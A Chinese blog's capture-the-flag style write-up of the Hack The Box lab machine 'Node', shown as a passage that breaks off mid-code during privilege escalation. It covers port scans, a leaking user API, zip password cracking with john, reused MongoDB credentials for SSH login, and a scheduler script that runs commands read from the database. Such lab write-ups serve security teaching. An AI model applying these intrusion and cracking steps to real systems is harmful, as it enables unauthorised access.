    background-repeat: round;
    border: none;
    box-shadow: 1px 1px 3px rgba(0, 0, 0, .3);
}


body{
    background-size:auto;
}
#video-add{
    background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/add.png);
}
@media (max-width:860px) {
  .headertop.filter-dot::before {
    background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/grid.png);
  }
}
.headertop.filter-grid::before {
  background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/grid.png);
}

.headertop.filter-dot::before {
  background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/dot.gif);
}
.loadvideo,.video-play {
  background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/play.png);
}

.video-pause {
  background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/stop.png);
}
#loading-comments {
background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/load_svg/ball.svg);
}</style>
	<link rel="stylesheet" href="https://cdn2.tianli0.top/fonts/css?family=Noto+Serif|Noto+Serif+SC|Noto+Sans+SC|Dela+Gothic+One|Fira+Code&display=swap" media="all">
	<script src="https://cdnjs.cloudflare.com/ajax/libs/seedrandom/3.0.5/seedrandom.min.js"></script>
	<script type="text/javascript">if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
			alert('朋友，IE浏览器未适配哦~\n如果是 360、QQ 等双核浏览器，请关闭 IE 模式！');
		}</script>
	<script type="text/javascript">function changeBackgroundImage(json_object) {
	        var webp_url_prefix = "https://gcore.jsdelivr.net/gh/misaka19008/misaka19008-blog-static@0.1/manifest/webp/"
	        var img_type = ".source.webp"
	        var imageList = new Array();
	        Object.keys(json_object).forEach(key => {imageList.push(webp_url_prefix + key + img_type);});
	        var arr_length = imageList.length;
	        var idx_min = 0;
	        var idx_max = arr_length - 1
	        let random_generater = new Math.seedrandom(Date.now());
	        var random_idx = Math.floor(random_generater() * (idx_max - idx_min + 1)) + idx_min;
	        document.getElementById("centerbg").style.backgroundImage = "url('" + imageList[random_idx] + "')";
	    };
	    function getImageList() {
	        fetch("https://gcore.jsdelivr.net/gh/misaka19008/misaka19008-blog-static@0.1/manifest/manifest.json")
	         .then(response => response.json())
	         .then(data => changeBackgroundImage(data))
	         .catch(error => console.log(error));
	    };
	    window.onload = function() {
	        getImageList();
	        document.getElementById("bg-pre").onclick = function() { getImageList(); }
	        document.getElementById("bg-next").onclick = function() { getImageList(); }
	    };</script>
		</head>

<body class="post-template-default single single-post postid-45 single-format-standard chinese-font  ">
			<div id="preload">
			<li data-id="3" class="active">
				<div id="preloader_3"></div>
			</li>
		</div>
		<div class="scrollbar" id="bar"></div>
	<header class="site-header no-select" role="banner">
		<div class="site-top">
			<div class="site-branding">
									<span class="site-title">
						<span class="logolink moe-mashiro">
							<a href="https://misaka19008.github.io/">
								<ruby>
									<span class="sakuraso"></span>
									<span class="no"></span>
									<span class="shironeko"></span>
									<rp></rp>
									<rt class="chinese-font"></rt>
									<rp></rp>
								</ruby>
							</a>
						</span>
					</span>
								<!-- logo end -->
			</div>
<!-- .site-branding -->
			    <div class="header-user-avatar">
      <a href="https://misaka19008.github.io/wp-login.php?redirect_to=http%3A%2F%2Fhttps%3A%2F%2Fmisaka19008.github.io%2F2024%2F07%2F08%2Fhtb%25E9%259D%25B6%25E6%259C%25BA-node-%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%25E8%25AE%25B0%25E5%25BD%2595%3Fpage%26year%3D2024%26monthnum%3D07%26day%3D08%26name%3Dhtb%25E9%259D%25B6%25E6%259C%25BA-node-%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%25E8%25AE%25B0%25E5%25BD%2595">
        <img alt="header_user_avatar" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/basic/topavatar.png" width="30" height="30">
      </a>
      <div class="header-user-menu">
        <div class="header-user-name no-logged">
          <a id="login-link" href="https://misaka19008.github.io/wp-login.php?redirect_to=http%3A%2F%2Fhttps%3A%2F%2Fmisaka19008.github.io%2F2024%2F07%2F08%2Fhtb%25E9%259D%25B6%25E6%259C%25BA-node-%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%25E8%25AE%25B0%25E5%25BD%2595%3Fpage%26year%3D2024%26monthnum%3D07%26day%3D08%26name%3Dhtb%25E9%259D%25B6%25E6%259C%25BA-node-%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%25E8%25AE%25B0%25E5%25BD%2595" data-no-pjax style="font-weight:bold;text-decoration:none">登录</a>
        </div>
      </div>
    </div>
  				<div class="searchbox js-toggle-search"><i class="fa-solid fa-magnifying-glass"></i></div>
						<div class="lower">				<nav><div class="menu"></div>
</nav><!-- #site-navigation -->
			</div>
		</div>
	</header><!-- #masthead -->
	<div class="openNav no-select">
		<div class="iconflat no-select" style="padding: 30px;">
			<div class="icon"></div>
		</div>
	</div>
<!-- m-nav-bar -->
	<section id="main-container">
					<div class="headertop filter-nothing">
				<div id="banner_wave_1"></div>
<div id="banner_wave_2"></div>
<figure id="centerbg" class="centerbg">
            <div class="focusinfo">
                            <div class="header-tou">
<a href="https://misaka19008.github.io/"><img alt="avatar" loading="lazy" src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719800327-misaka.jpg"></a>
                </div>
                        <div class="header-container">
                <div class="header-info">
                    <!-- 首页一言打字效果 -->
                                        <p>哪个御坂妹妹是渗透菜鸡啊，do，御坂自嘲说道</p>
                                    </div>               
            </div>

                            <div class="top-social">
                            <li id="bg-pre"><img src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/pre.png" loading="lazy" alt="上一篇"></li>
            <li class="wechat">
<a href="#" title="WeChat"><img loading="lazy" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/wechat.png"></a>
            <div class="wechatInner">
                <img class="wechat-img" style="height: max-content;width: max-content;" loading="lazy" src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719807830-_cgi-bin_mmwebwx-bin_webwxgetmsgimg__MsgID6782339628574173819skey@crypt_e6c7b24_f141a2512eeb2d420c61e8b19d3c7620mmweb_appidwx_webfilehelper.jpg" alt="WeChat">
            </div>
        </li>
                <li><a href="https://space.bilibili.com/3546678869101076" target="_blank" class="social-bili" title="bilibili"><img alt="bilibili" loading="lazy" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/bilibili.png"></a></li>
                    <li><a href="tencent://message/?uin=2423075915" target="_blank" class="social-qq" title="qq"><img alt="qq" loading="lazy" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/qq.png"></a></li>
                    <li><a href="https://music.163.com/#/user/home?id=1799601038" target="_blank" class="social-wangyiyun" title="cloudmusic"><img alt="cloudmusic" loading="lazy" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/ncm.png"></a></li>
                    <li><a href="https://github.com/misaka19008" target="_blank" class="social-github" title="github"><img alt="github" loading="lazy" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/github.png"></a></li>
                    <li><a href="https://blog.csdn.net/qwe304" target="_blank" class="social-wangyiyun" title="csdn"><img alt="csdn" loading="lazy" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/csdn.png"></a></li>
                <li><a onclick="mail_me()" class="social-wangyiyun" title="E-mail"><img loading="lazy" alt="E-mail" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/mail.png"></a></li>
            <li id="bg-next"><img loading="lazy" src="https://s.nmxc.ltd/sakurairo_vision/@2.6/display_icon/muh2/next.png" alt="下一篇"></li>
                    </div>
                    </div>
    </figure>
<!-- 首页下拉箭头 -->
<div class="headertop-down" onclick="headertop_down()"><span><svg t="1682342753354" class="homepage-downicon" viewbox="0 0 1843 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="21355" width="80px" height="80px"><path d="M1221.06136021 284.43250057a100.69380037 100.69380037 0 0 1 130.90169466 153.0543795l-352.4275638 302.08090944a100.69380037 100.69380037 0 0 1-130.90169467 0L516.20574044 437.48688007A100.69380037 100.69380037 0 0 1 647.10792676 284.43250057L934.08439763 530.52766665l286.97696258-246.09516608z" fill="rgba(255,255,255,0.8)" p-id="21356"></path></svg></span></div>
			</div>
				<div id="page" class="site wrapper">
			  <div class="pattern-center-blank"></div>
  <div class="pattern-center single-center">
    <div class="pattern-attachment bg lazyload" style="background-image: url(https://s.nmxc.ltd/sakurairo_vision/@2.6/load_svg/outload.svg)" data-src="https://misaka19008.github.io/wp-content/uploads/2024/07/1719804541-Hack-The-Box-logo.png"> </div>
    <header class="pattern-header single-header"><h1 class="entry-title">HTB靶机 Node 渗透测试记录</h1>
<span class="toppic-line"></span><p class="entry-census"><span><a href="https://misaka19008.github.io/author/misaka19008/"><img alt="" src="http://weavatar.com/avatar/5a5739bcdd233b04d412983f4d9172d2?s=64&#038;d=mm&#038;r=g" srcset="http://weavatar.com/avatar/5a5739bcdd233b04d412983f4d9172d2?s=128&#038;d=mm&#038;r=g 2x" class="avatar avatar-64 photo" height="64" width="64" decoding="async"></a></span><span><a href="https://misaka19008.github.io/author/misaka19008/">misaka19008</a></span><span class="bull">·</span>1 天前<span class="bull">·</span>5 次阅读</p></header>
  </div>
  			<div id="content" class="site-content">
	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">
		
<div class="has-toc have-toc"></div>

<article id="post-45" class="post-45 post type-post status-publish format-standard has-post-thumbnail hentry category-htb_notes tag-htb">
		<!--<div class="toc-entry-content">--><!-- 套嵌目录使用（主要为了支援评论）-->
		<div class="entry-content">
		<div class="post-toc-block float-default with-border"> 
						<div class="post-toc-header">内容纲要</div>
						<nav id="md-post-toc" class="md-post-toc"></nav>
						</div>
<hr>
<h1>目标信息</h1>
<blockquote>
<p><strong>IP地址：<code>10.10.10.58</code></strong></p>
</blockquote>
<hr>
<h1>信息收集</h1>
<h2>ICMP检测</h2>
<pre><code>┌──(root㉿hacker)-[/home/…/Documents/pentest_notes/node/nmap_reports]
└─# ping -c 4 10.10.10.58
PING 10.10.10.58 (10.10.10.58) 56(84) bytes of data.
64 bytes from 10.10.10.58: icmp_seq=1 ttl=63 time=243 ms
64 bytes from 10.10.10.58: icmp_seq=2 ttl=63 time=242 ms
64 bytes from 10.10.10.58: icmp_seq=3 ttl=63 time=242 ms
64 bytes from 10.10.10.58: icmp_seq=4 ttl=63 time=242 ms

--- 10.10.10.58 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 241.739/242.107/242.543/0.317 ms</code></pre>
<p>攻击机和靶机间网络连接良好。</p>
<h2>防火墙检测</h2>
<pre><code># Nmap 7.94SVN scan initiated Sun Jun 23 10:24:55 2024 as: nmap -sA -p- --min-rate 2000 -oN ./ack_result.txt 10.10.10.58
Nmap scan report for 10.10.10.58 (10.10.10.58)
Host is up (0.25s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE      SERVICE
22/tcp   unfiltered ssh
3000/tcp unfiltered ppp

# Nmap done at Sun Jun 23 10:26:01 2024 -- 1 IP address (1 host up) scanned in 66.57 seconds</code></pre>
<p>靶机开放了<code>2</code>个<code>TCP</code>端口。</p>
<h2>网络端口扫描</h2>
<p><strong><code>TCP</code>端口扫描结果</strong></p>
<pre><code># Nmap 7.94SVN scan initiated Sun Jun 23 10:28:27 2024 as: nmap -sS -sV -A -p 22,3000 -oN ./tcp_result.txt 10.10.10.58
Nmap scan report for 10.10.10.58 (10.10.10.58)
Host is up (0.25s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|5.X (90%), Crestron 2-Series (86%), Google Android 4.X (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:google:android:4.0 cpe:/o:linux:linux_kernel:5.0 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   289.07 ms 10.10.14.1 (10.10.14.1)
2   241.85 ms 10.10.10.58 (10.10.10.58)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 23 10:29:06 2024 -- 1 IP address (1 host up) scanned in 38.70 seconds</code></pre>
<p><strong><code>UDP</code>端口开放列表扫描结果</strong></p>
<pre><code># Nmap 7.94SVN scan initiated Sun Jun 23 10:29:41 2024 as: nmap -sU -p- --min-rate 2000 -oN ./udp_result.txt 10.10.10.58
Nmap scan report for 10.10.10.58 (10.10.10.58)
Host is up (0.29s latency).
All 65535 scanned ports on 10.10.10.58 (10.10.10.58) are in ignored states.
Not shown: 65535 open|filtered udp ports (no-response)

# Nmap done at Sun Jun 23 10:30:49 2024 -- 1 IP address (1 host up) scanned in 68.33 seconds</code></pre>
<p><strong><code>UDP</code>端口详细信息扫描结果</strong></p>
<pre><code>（无）</code></pre>
<p>同时发现靶机操作系统为<code>Ubuntu Linux</code>，内核版本大致为<code>Linux 3.10 - 4.11</code>。</p>
<hr>
<h1>服务探测</h1>
<h2>SSH服务（22端口）</h2>
<p>端口<code>Banner</code>：</p>
<pre><code>┌──(root㉿hacker)-[/home/megumin/Documents/pentest_notes/node]
└─# nc -nv 10.10.10.58 22                                        
(UNKNOWN) [10.10.10.58] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</code></pre>
<h2>Web应用程序（3000端口）</h2>
<p>打开主页：<code>http://node.htb/</code>（尝试加上域名）<br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719185894609-8890729a-cdda-415d-8932-b0626d205a2e.png#averageHue=%2318bc9c&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u5909a00d&amp;originHeight=790&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=82387&amp;status=done&amp;style=none&amp;taskId=ue7d1a16f-3e01-46d2-8825-33c8952285a&amp;title=" alt="主页.png"><br>
在页面末尾发现<code>3</code>个人名：<code>tom</code>、<code>mark</code>、<code>rastating</code>。<br>
尝试扫描目录：</p>
<pre><code># Dirsearch started Mon Jun 24 07:45:11 2024 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://node.htb:3000/ -x 400,403,404 -e php,js,html,asp,aspx,txt,zip,tar.gz,pcap -t 60

301   171B   http://node.htb:3000/assets    -&gt; REDIRECTS TO: /assets/
301   173B   http://node.htb:3000/uploads    -&gt; REDIRECTS TO: /uploads/</code></pre>
<p>未发现关键信息。<br>
尝试查看网页源代码，在页面中发现引用了如下<code>JavaScript</code>：</p>
<pre><code class="language-html">  &lt;script type=&quot;text/javascript&quot; src=&quot;assets/js/app/app.js&quot;&gt;&lt;/script&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;assets/js/app/controllers/home.js&quot;&gt;&lt;/script&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;assets/js/app/controllers/login.js&quot;&gt;&lt;/script&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;assets/js/app/controllers/admin.js&quot;&gt;&lt;/script&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;assets/js/app/controllers/profile.js&quot;&gt;&lt;/script&gt;</code></pre>
<p>依次点击查看内容，在<code>/profile.js</code>中挖掘出了敏感<code>API</code>端点<code>/api/users</code>：</p>
<pre><code class="language-javascript">var controllers = angular.module(&#039;controllers&#039;);

controllers.controller(&#039;ProfileCtrl&#039;, function ($scope, $http, $routeParams) {
  $http.get(&#039;/api/users/&#039; + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = &#039;This user does not exist&#039;;
      }
      else {
        $scope.errorMessage = &#039;An unexpected error occurred&#039;;
      }
    });
});</code></pre>
<p>直接访问：<br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719187878848-d85eb33c-3f94-4ac5-b1aa-6df943d3e86e.png#averageHue=%231d1e22&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u7c3b75a8&amp;originHeight=790&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=113897&amp;status=done&amp;style=none&amp;taskId=u61263ca5-09b3-42a5-a5c1-6cf1fb4f58c&amp;title=" alt="用户密码api.png"><br>
<strong>成功发现了用户账密！</strong></p>
<table>
<thead>
<tr>
<th>ID</th>
<th>用户名</th>
<th>密码</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>myP14ceAdm1nAcc0uNT</td>
<td>manchester</td>
</tr>
<tr>
<td>2</td>
<td>tom</td>
<td>spongebob</td>
</tr>
<tr>
<td>3</td>
<td>mark</td>
<td>snowflake</td>
</tr>
<tr>
<td>4</td>
<td>rastating</td>
<td>（未知）</td>
</tr>
</tbody>
</table>
<p>尝试登录管理员用户<code>myP14ceAdm1nAcc0uNT</code>，成功：<br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719188349372-56fb54cf-7084-4b87-a62e-0ce138054e39.png#averageHue=%23e6e6e2&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=ua80446cb&amp;originHeight=790&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=88438&amp;status=done&amp;style=none&amp;taskId=u39cd594a-5992-4a28-9f1a-f9ce0d9bdbf&amp;title=" alt="登录管理员.png"></p>
<hr>
<h1>渗透测试</h1>
<p>登录后台后，点击<code>Download Backup</code>按钮，会跳出下载内容，但是总是下载失败。尝试使用<code>BurpSuite</code>拦截流量并重放请求，发现返回的内容是一段超长的<code>Base64</code>文本：<br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719188592660-c827a4e9-d811-4a48-be1e-622b882c3b44.png#averageHue=%23f2f1f1&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u644d1296&amp;originHeight=790&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=210097&amp;status=done&amp;style=none&amp;taskId=u77fa36dd-a5f6-4ed0-beb7-815c0c2b155&amp;title=" alt="超长base64.png"><br>
将其保存为文件，随后使用如下<code>Linux</code>命令解码保存：</p>
<pre><code class="language-bash">sed -i &quot;1,9d&quot; ./down_base64.txt
cat ./down_base64.txt | base64 -d &gt; ./downfile</code></pre>
<p><del>（真是费了花火大人好大的功夫呀，为了拿到完整的base64数据包，花火大人整整按了2个小时的下载和发包按钮呢，所以，作者大大，晚上不要睡太死哦~ So，so，哈吉没油，Zafkiel！！！）</del><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719194854085-ce7e510f-123c-4eb4-9fdf-0dde177a62a6.png#averageHue=%23bebebc&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;height=138&amp;id=u29123f47&amp;originHeight=549&amp;originWidth=546&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=345125&amp;status=done&amp;style=none&amp;taskId=u1cc484f7-f93e-4951-9656-bdd0b56920d&amp;title=&amp;width=137" alt="dd259f3d557c510a2eeed7ba326e4c31_7753066910551881103.png"><br>
尝试使用<code>file</code>命令判断二进制文件的类型，发现为<code>ZIP</code>压缩包，尝试解压，发现需要密码：<br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719195058288-c4076d97-e38b-4451-a74b-17e51ba78676.png#averageHue=%23252832&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=ubec19f5d&amp;originHeight=516&amp;originWidth=610&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=51164&amp;status=done&amp;style=none&amp;taskId=u297faaf1-c361-4a2f-89ae-5dc70274bb0&amp;title=" alt="需要密码.png"><br>
尝试使用之前发现的密码解压，失败。<br>
尝试使用<code>john</code>工具爆破密码：</p>
<pre><code class="language-bash">zip2john ./downfile.zip &gt; ./zip_hash.txt
john ./zip_hash.txt</code></pre>
<p><img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719196560422-0f493a88-5e1d-40d6-8553-2d22d92e169f.png#averageHue=%23262836&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=ueb7c6ef4&amp;originHeight=755&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=540448&amp;status=done&amp;style=none&amp;taskId=u8906742a-f864-4999-8d90-80277b13646&amp;title=" alt="成功爆破zip密码.png"><br>
<strong>成功找到口令：<code>magicword</code>。</strong><br>
直接解压，尝试查看网站主程序<code>app.js</code>，发现<code>MongoDB</code>的登录凭据：</p>
<pre><code class="language-javascript">const express     = require(&#039;express&#039;);
const session     = require(&#039;express-session&#039;);
const bodyParser  = require(&#039;body-parser&#039;);
const crypto      = require(&#039;crypto&#039;);
const MongoClient = require(&#039;mongodb&#039;).MongoClient;
const ObjectID    = require(&#039;mongodb&#039;).ObjectID;
const path        = require(&quot;path&quot;);
const spawn        = require(&#039;child_process&#039;).spawn;
const app         = express();
const url         = &#039;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#039;;
const backup_key  = &#039;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#039;;</code></pre>
<p>尝试将其作为<code>SSH</code>用户的登录凭据：</p>
<ul>
<li><strong>用户名：<code>mark</code></strong></li>
<li><strong>密码：<code>5AYRft73VtFpc84k</code></strong></li>
</ul>
<p>直接登录：<br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719197059514-4587e095-bb4f-4642-b675-bbc19aff8f4f.png#averageHue=%23191c2f&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u8bab3c93&amp;originHeight=790&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=83088&amp;status=done&amp;style=none&amp;taskId=u6605cf7f-c812-48da-91de-4a3bccf74da&amp;title=" alt="登录ssh.png"><br>
<strong>成功！！！</strong></p>
<hr>
<h1>权限提升</h1>
<h2>本地信息收集</h2>
<p><strong>基本系统信息</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198665329-2e61502c-0f7f-4e7d-a408-41db75364623.png#averageHue=%2313182a&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=ub43640fd&amp;originHeight=679&amp;originWidth=1255&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=71000&amp;status=done&amp;style=none&amp;taskId=u88ff71e9-6e3b-4075-bd3c-4bfcba51ea9&amp;title=" alt="基本信息.png"><br>
<strong>进程列表</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198670378-809c373a-2d86-47e2-8608-59a3ccc91fec.png#averageHue=%2313172a&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u664853cb&amp;originHeight=767&amp;originWidth=1255&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=163918&amp;status=done&amp;style=none&amp;taskId=u7527ce53-1c56-46b7-90fd-4fe62f40c49&amp;title=" alt="进程列表.png"><br>
<strong>计划任务列表</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198678306-348f7822-8773-4bea-8bf7-2ceed6e25a10.png#averageHue=%23141729&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u102270e9&amp;originHeight=786&amp;originWidth=647&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=62768&amp;status=done&amp;style=none&amp;taskId=ucc9572a0-ed44-49d9-b120-b30bc3a7faf&amp;title=" alt="计划任务.png"><br>
<strong>环境变量</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198687591-2f41eb2b-d6a6-4c62-8645-e84a9faf93d0.png#averageHue=%23131729&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u39566c6f&amp;originHeight=666&amp;originWidth=1253&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=79616&amp;status=done&amp;style=none&amp;taskId=ue556e2c5-3542-460d-a2c9-3d4cfaf4f5c&amp;title=" alt="环境变量.png"><br>
<strong>用户信息</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198695407-e51c56bc-286d-4d3f-9dca-2fa8f037de83.png#averageHue=%2313182b&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u871dc6f9&amp;originHeight=759&amp;originWidth=1093&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=114292&amp;status=done&amp;style=none&amp;taskId=ua58a14b3-5a55-473c-ba23-417d657e8b4&amp;title=" alt="用户列表.png"><br>
<strong>用户家目录</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198701569-978a9ecd-1635-4848-b660-1ee32e02d25b.png#averageHue=%2313182a&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=uf6bfd66e&amp;originHeight=130&amp;originWidth=412&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=11477&amp;status=done&amp;style=none&amp;taskId=u913cc261-edb8-4fa3-995c-3e4db67077b&amp;title=" alt="用户家目录.png"><br>
<strong>特殊权限文件</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198707537-f3c2d372-4829-4b53-b9b0-e224822ae4e2.png#averageHue=%23131729&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u8df655bf&amp;originHeight=819&amp;originWidth=1214&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=202020&amp;status=done&amp;style=none&amp;taskId=u2b4027d6-6644-4740-94d2-bd8f7ac59a7&amp;title=" alt="特权文件.png"><br>
<strong>开放端口信息</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198713475-ef552fa7-b295-4633-97a5-1e052a24160b.png#averageHue=%2313182b&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=uc204212f&amp;originHeight=165&amp;originWidth=694&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=15635&amp;status=done&amp;style=none&amp;taskId=ub086f329-d578-4997-b58f-509449097ba&amp;title=" alt="开放端口.png"><br>
<strong>敏感文件权限</strong><br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719198720389-fe2fecf2-0d44-4c74-a175-dc5be3fa1804.png#averageHue=%2314182b&amp;clientId=u8f69d137-4b02-4&amp;from=ui&amp;id=u124378be&amp;originHeight=235&amp;originWidth=838&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=29854&amp;status=done&amp;style=none&amp;taskId=u92d46402-431d-4c3c-892d-e9511fededb&amp;title=" alt="敏感文件.png"><br>
经分析研判，发现<code>tom</code>用户除了使用<code>Node.js</code>运行了可疑脚本<code>/var/scheduler/app.js</code>，查看脚本之后发现其功能是循环地将要执行的操作系统命令从<code>MongoDB</code>中取出，随后使用<code>child_process</code>模块的<code>exec</code>函数执行。决定向<code>MongoDB</code>中的对应表内写入系统命令字符串以进行提权。同时还发现<code>/usr/local/bin/backup</code>为<code>SUID</code>程序，但当前为<code>mark</code>用户，不在<code>admin</code>用户组中，无法利用。</p>
<h2>Node.JS脚本提权</h2>
<p><code>/var/scheduler/app.js</code>脚本的内容如下：</p>
<pre><code class="language-javascript">const exec        = require(&#039;child_process&#039;).exec;
const MongoClient = require(&#039;mongodb&#039;).MongoClient;
const ObjectID    = require(&#039;mongodb&#039;).ObjectID;
const url         = &#039;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#039;;

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log(&#039;[!] Failed to connect to mongodb&#039;);
    return;
  }

  setInterval(function () {
    db.collection(&#039;tasks&#039;).find().toArray(function (error, docs) {
      if (!error &amp;&amp; docs) {
